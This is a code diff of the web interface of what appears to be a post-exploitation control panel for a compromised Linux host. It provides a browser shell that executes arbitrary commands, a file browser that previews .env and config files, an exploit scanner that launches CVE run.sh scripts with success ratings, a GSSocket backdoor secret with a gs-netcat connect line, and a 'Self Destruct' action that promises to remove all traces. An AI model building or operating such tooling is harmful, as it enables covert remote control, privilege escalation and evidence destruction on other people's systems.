-<div id="p-term" class="page"><div class="panel" style="height:calc(100vh - 100px)"><h2>Shell</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">bash</span></div><div class="term-body" id="to"></div><div class="term-input"><input id="tc" placeholder="$ enter command" onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">EXEC</button></div></div></div></div>
-<div id="p-proc" class="page"><div class="panel" style="height:calc(100vh - 100px)"><h2>Processes</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">ps aux</span></div><div class="term-body" id="po"></div></div></div></div>
-<div id="p-net" class="page"><div class="panel" style="height:calc(100vh - 100px)"><h2>Network</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">connections</span></div><div class="term-body" id="no"></div></div></div></div>
+
+<div id="p-proc" class="page">
+<div class="header"><h1>Process <span>Monitor</span></h1><div class="badge" style="cursor:pointer" onclick="loadProc()"><i></i>Refresh</div></div>
+<div class="card"><div class="term" style="height:calc(100vh - 180px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux</div></div><div class="term-body" id="po" style="max-height:calc(100vh - 250px)"></div></div></div>
+</div>
+
+<div id="p-net" class="page">
+<div class="header"><h1>Network <span>Connections</span></h1><div class="badge" style="cursor:pointer" onclick="loadNet()"><i></i>Refresh</div></div>
+<div class="card"><div class="term" style="height:calc(100vh - 180px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">netstat</div></div><div class="term-body" id="no" style="max-height:calc(100vh - 250px)"></div></div></div>
+</div>
+
 <div id="p-cfg" class="page">
-<div class="grid2">
-<div class="panel"><h2>Deploy Key</h2><div class="key-box" onclick="navigator.clipboard.writeText(this.innerText)">%s</div></div>
-<div class="panel"><h2>GSSocket</h2><div class="key-box" id="gs2">-</div><p style="margin-top:8px;font-size:9px;color:var(--text2)">Connect: <code style="color:var(--gold)">gs-netcat -s KEY -p 8888</code></p></div>
+<div class="header"><h1>System <span>Configuration</span></h1></div>
+<div class="grid grid-2">
+<div class="card"><div class="card-title">Deploy Key</div><div class="key-box" onclick="navigator.clipboard.writeText(this.innerText);this.style.borderColor='var(--green)'">%s</div><div class="card-sub" style="margin-top:8px">Click to copy</div></div>
+<div class="card"><div class="card-title">GSSocket Secret</div><div class="key-box" id="gsbox">%s</div><div class="card-sub" style="margin-top:8px">gs-netcat -s SECRET -p 8888</div></div>
 </div>
-<div class="panel"><h2>Actions</h2><div class="acts"><button class="btn" onclick="pull()">↻ UPDATE REPO</button><button class="btn btn-g" onclick="rc2('id;whoami;pwd')">WHOAMI</button><button class="btn btn-r" onclick="nuke()">DESTRUCT</button></div></div>
+<div class="card" style="margin-top:12px"><div class="card-title">Actions</div><div class="btns"><button class="btn" onclick="pull()">↻ Update Repository</button><button class="btn btn-ghost" onclick="rc2('id && whoami && pwd')">Check Identity</button><button class="btn btn-red" onclick="nuke()">☠ Self Destruct</button></div></div>
 </div>
-</div>
-<div class="sidebar">
-<div class="fm">
-<div class="fm-head"><h2 style="font-size:9px;color:var(--text2);letter-spacing:2px;margin-bottom:8px">FILE MANAGER</h2><div class="fm-path" id="bc"></div></div>
-<div class="fm-list" id="fls"></div>
+</main>
+
+<div class="rsb">
+<div class="rsb-head"><h3>File Manager</h3><div class="fm-path" id="bc"></div></div>
+<div class="rsb-body" id="fls"></div>
 <div id="fpreview"></div>
 </div>
 </div>
-</div>
+
 <script>
 const $=s=>document.getElementById(s);
 const api=async(e,d)=>{try{return(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})})).json();}catch(e){return{error:e.message}}};
 const log=(el,t,c='')=>{const d=document.createElement('div');d.className='ln '+c;d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
-const clear=el=>$(el).innerHTML='';
-const nav=p=>{document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('nav a').forEach(x=>x.classList.remove('on'));$('p-'+p).classList.add('on');document.querySelector(`nav a[data-p=${p}]`)?.classList.add('on');
-if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();if(p==='cfg'){$('gs2').innerText=$('gskey').innerText;}};
-document.querySelectorAll('nav a').forEach(a=>a.onclick=()=>nav(a.dataset.p));
-let cwd='/';
-async function init(){
-$('sys').innerHTML='<div class="stat"><div class="stat-v" style="color:var(--text2)">Loading...</div></div>';
-const s=await api('run',{path:'scripts/sysinfo.sh'});
-try{const d=JSON.parse(s.output||'{}');let h='';for(const[k,v]of Object.entries(d))h+=`<div class="stat"><div class="stat-l">${k}</div><div class="stat-v">${v}</div></div>`;$('sys').innerHTML=h;}
-catch(e){$('sys').innerHTML=`<div class="stat"><div class="stat-v" style="color:var(--red)">${s.output||'Error'}</div></div>`;}
-scanInit();ls(cwd);
+const clear=el=>{if($(el))$(el).innerHTML='';};
+document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));
+let cwd='/',liveTimer;
+
+function nav(p){
+document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));
+document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));
+$('p-'+p)?.classList.add('on');
+document.querySelector(`.nav-item[data-p="${p}"]`)?.classList.add('on');
+if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();
 }
+
+async function init(){
+const s=await api('run',{path:'scripts/sysinfo.sh'});
+try{const d=JSON.parse(s.output||'{}');
+$('s_kernel').textContent=d.kernel||'-';
+$('s_user').textContent=d.user||'-';
+$('s_uid').textContent='UID: '+(d.uid||'-');
+$('s_uptime').textContent=d.uptime||'-';
+$('s_mem').textContent=d.mem||'-';
+}catch(e){$('s_kernel').textContent='Error';}
+scanInit();ls(cwd);startLive();
+}
+
+function startLive(){
+async function update(){
+const r=await api('exec',{cmd:"echo $(grep 'cpu ' /proc/stat|awk '{u=$2+$4;t=$2+$4+$5;print int(u*100/t)}') $(free|awk '/Mem:/{print int($3*100/$2)}') $(df /|tail -1|awk '{print $5}'|tr -d '%')"});
+const[cpu,mem,disk]=(r.output||'0 0 0').trim().split(' ');
+$('live').innerHTML=`
+<div class="live-stat"><div class="live-stat-label">CPU</div><div class="live-stat-value">${cpu}%</div><div class="live-stat-bar"><i style="width:${cpu}%;background:${cpu>80?'var(--red)':cpu>50?'var(--gold)':'var(--green)'}"></i></div></div>
+<div class="live-stat"><div class="live-stat-label">Memory</div><div class="live-stat-value">${mem}%</div><div class="live-stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':mem>50?'var(--gold)':'var(--green)'}"></i></div></div>
+<div class="live-stat"><div class="live-stat-label">Disk</div><div class="live-stat-value">${disk}%</div><div class="live-stat-bar"><i style="width:${disk}%;background:${disk>80?'var(--red)':disk>50?'var(--gold)':'var(--green)'}"></i></div></div>
+<div class="live-stat"><div class="live-stat-label">Load</div><div class="live-stat-value" id="loadavg">-</div></div>`;
+const r2=await api('exec',{cmd:"cat /proc/loadavg|awk '{print $1}'"});
+if($('loadavg'))$('loadavg').textContent=r2.output?.trim()||'-';
+}
+update();liveTimer=setInterval(update,3000);
+}
+
 async function scanInit(){
-$('scan').innerHTML=`<div class="progress"><i id="sprog" style="width:0%"></i></div><div class="scan-log" id="slog"></div>`;
-const steps=['Checking kernel...','Scanning SUID...','Analyzing capabilities...','Checking permissions...','Complete'];
-for(let i=0;i<steps.length;i++){log('slog',steps[i],'info');$('sprog').style.width=((i+1)/steps.length*100)+'%';await new Promise(r=>setTimeout(r,200));}
+$('scan').innerHTML=`<div class="progress"><i id="sprog" style="width:0%"></i></div><div id="slog" style="max-height:120px;overflow-y:auto;margin-top:8px"></div>`;
+const steps=['Analyzing kernel version...','Scanning SUID binaries...','Checking capabilities...','Reviewing permissions...','Finalizing results...'];
+for(let i=0;i<steps.length;i++){log('slog',steps[i],'info');$('sprog').style.width=((i+1)/steps.length*100)+'%';await new Promise(r=>setTimeout(r,150));}
 const r=await api('run',{path:'exploits/gate.sh'});
 try{const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){for(const x of d.exploits){log('slog',`${x.cve} - ${x.name} [${x.rate}%]`,'ok');}
-let h='<div style="margin-top:12px">';for(const x of d.exploits.slice(0,3)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
-h+='</div>';$('scan').innerHTML+='<div style="margin-top:12px">'+h+'</div>';}else log('slog','No exploits found','err');}
-catch(e){log('slog',r.output||'Error','err');}}
+if(d.exploits?.length){for(const x of d.exploits)log('slog',`✓ ${x.cve} - ${x.name} [${x.rate}%]`,'ok');
+let h='<div style="margin-top:16px">';
+for(const x of d.exploits.slice(0,4)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';
+h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
+$('scan').innerHTML+='</div>'+h;}else log('slog','No exploits found','info');
+}catch(e){log('slog',r.output||'Error','err');}}
+
 async function scan(){
-$('expl').innerHTML='<div style="color:var(--text2)">Scanning...</div>';
+$('expl').innerHTML='<div style="color:var(--text2);padding:20px;text-align:center">Scanning...</div>';
 const r=await api('run',{path:'exploits/gate.sh'});
 try{const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}$('expl').innerHTML=h;}
-else $('expl').innerHTML='<div style="color:var(--text2)">No exploits</div>';}catch(e){$('expl').innerHTML=`<div style="color:var(--red)">${r.output}</div>`;}}
+if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';
+h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
+$('expl').innerHTML=h;}else $('expl').innerHTML='<div style="color:var(--text2);padding:20px;text-align:center">No exploits available</div>';}
+catch(e){$('expl').innerHTML=`<div style="color:var(--red);padding:20px">${r.output}</div>`;}}
+
 async function runE(cve){if(!confirm('Execute '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
 async function rs(p){if(!p)return;clear('so');log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
-async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,l.toLowerCase().includes('error')?'err':'ok'));}
+async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,l.toLowerCase().includes('error')||l.toLowerCase().includes('denied')?'err':'ok'));}
 async function rc2(c){clear('to');log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,'ok'));nav('term');}
-async function loadProc(){clear('po');log('po','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem | head -30'});(r.output||'').split('\n').forEach(l=>log('po',l,'info'));}
-async function loadNet(){clear('no');log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null'});(r.output||'').split('\n').forEach(l=>log('no',l,'info'));log('no','','');log('no','$ ip a','cmd');const r2=await api('exec',{cmd:'ip a 2>/dev/null | grep -E "inet |ether "'});(r2.output||'').split('\n').forEach(l=>log('no',l,'info'));}
+async function loadProc(){clear('po');log('po','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem 2>/dev/null|head -40'});(r.output||'').split('\n').forEach((l,i)=>log('po',l,i===0?'info':''));}
+async function loadNet(){clear('no');log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn 2>/dev/null'});(r.output||'').split('\n').forEach((l,i)=>log('no',l,i===0?'info':''));log('no','','');log('no','$ ip addr','cmd');const r2=await api('exec',{cmd:"ip addr 2>/dev/null|grep -E 'inet |link/ether'"});(r2.output||'').split('\n').forEach(l=>log('no',l,'info'));}
+
 async function ls(p){
 cwd=p;
-$('bc').innerHTML=p.split('/').filter(Boolean).reduce((a,x,i,arr)=>{const fp='/'+arr.slice(0,i+1).join('/');return a+`<span>/</span><a href="#" onclick="ls('${fp}');return false">${x}</a>`;},'<a href="#" onclick="ls(\'/\');return false">root</a>');
+const parts=p.split('/').filter(Boolean);
+$('bc').innerHTML=parts.reduce((a,x,i)=>{const fp='/'+parts.slice(0,i+1).join('/');return a+`<span>/</span><a href="#" onclick="ls('${fp}');return false">${x}</a>`;},'<a href="#" onclick="ls(\'/\');return false">~</a>');
 const d=await api('files',{path:p});
 let h='';
 if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" onclick="ls('${pr}')"><div class="fm-icon dir">↑</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}
-for(const f of(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name))){
-const np=p==='/'?'/'+f.name:p+'/'+f.name;
-const isDir=f.type==='dir';
+const files=(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
+for(const f of files){const np=p==='/'?'/'+f.name:p+'/'+f.name;const isDir=f.type==='dir';
 const ext=f.name.split('.').pop().toLowerCase();
-const icons={dir:'📁',sh:'⚡',py:'🐍',js:'📜',json:'{}',txt:'📄',log:'📋',conf:'⚙',html:'🌐',css:'🎨',c:'©',h:'©'};
-const icon=isDir?'📁':(icons[ext]||'📄');
-h+=`<div class="fm-item" onclick="${isDir?`ls('${np}')`:`preview('${np}')`}"><div class="fm-icon ${isDir?'dir':''}">${icon}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} ${f.size||''} ${f.mod||''}</div></div></div>`;}
-$('fls').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--text2)">Empty</div>';
+const icons={sh:'⚡',py:'🐍',js:'📜',json:'{}',txt:'📝',log:'📋',conf:'⚙',c:'©',h:'©',html:'🌐',css:'🎨',md:'📑'};
+h+=`<div class="fm-item" onclick="${isDir?`ls('${np}')`:`preview('${np}')`}"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} ${f.size||''}</div></div></div>`;}
+$('fls').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--text2)">Empty directory</div>';
 $('fpreview').innerHTML='';
 }
+
 async function preview(p){
 const r=await api('read',{path:p});
 const ext=p.split('.').pop().toLowerCase();
-const isText=['sh','txt','log','conf','py','js','json','html','css','c','h','md','xml','yml','yaml','ini'].includes(ext);
-if(r.content&&isText){$('fpreview').innerHTML=`<div class="fm-preview">${r.content.replace(/</g,'&lt;').substring(0,2000)}</div>`;}
-else{$('fpreview').innerHTML=`<div class="fm-preview" style="color:var(--text2)">${p}\n\nBinary or large file</div>`;}
+const textExt=['sh','txt','log','conf','py','js','json','html','css','c','h','md','xml','yml','yaml','ini','env','cfg'];
+if(r.content&&textExt.includes(ext)){
+$('fpreview').innerHTML=`<div class="fm-preview">${r.content.replace(/</g,'&lt;').substring(0,3000)}</div>`;
+}else{$('fpreview').innerHTML=`<div class="fm-preview" style="color:var(--text3)">${p.split('/').pop()}\n\nBinary or unsupported</div>`;}
 }
-async function pull(){const r=await api('pull');alert('Updated');location.reload();}
-async function nuke(){if(!confirm('⚠ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px;letter-spacing:4px">DESTROYED</div>';}
+
+async function pull(){const r=await api('pull');alert('Repository updated');location.reload();}
+async function nuke(){if(!confirm('⚠ SELF DESTRUCT?\n\nThis will remove all traces.'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-family:JetBrains Mono;font-size:24px;letter-spacing:4px">DESTROYED</div>';}
+
 init();
 </script>
 </body></html>
